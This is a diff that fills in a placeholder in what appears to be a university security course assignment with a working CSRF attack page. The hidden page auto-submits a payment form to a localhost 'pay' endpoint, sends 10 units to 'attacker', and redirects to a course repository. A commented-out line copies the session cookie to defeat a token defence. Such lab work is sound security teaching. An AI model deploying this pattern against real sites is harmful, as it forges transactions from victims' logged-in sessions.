@@ -1,6 +1,33 @@
-<!DOCTYPE html>
-<html>
-
-<!-- Insert CSRF attack code here -->
-
+<html hidden>
+    <body onload="submitForm()">
+        <form id="pay-form" action="http://localhost:8080/pay" method="post" target="output" >
+            <div class="form-group">
+                <!-- <input id="copy-token" name="session_token" hidden /> -->
+                <div class="form-label">To:</div>
+                <div class="form-input">
+                    <input id="recipient" name="recipient" type="text" />
+                </div>
+            </div>
+            <div class="form-group">
+            <div class="form-label">Amount:</div>
+            <div class="form-input"><input id="amount" name="amount" type="number" /></div>
+            </div>
+            <input class="form-button" type="submit" value="Pay"/>
+        </form>
+        <iframe name="output" id="output" ></iframe>
+        
+        <script>
+            function submitForm() {
+                document.getElementById("output").addEventListener("load", (event) => {
+                        event.preventDefault();
+                        window.location.href = "https://github.com/tomrist/cs5435-spring2024";
+                });
+                // document.getElementById("copy-token").value = document.cookie.split("session=")[1].split(";")[0];
+                document.getElementById("recipient").value = "attacker";
+                document.getElementById("amount").value = 10;
+                document.getElementById("pay-form").submit();
+            }
+        </script>
+    </body>
 </html>
+  
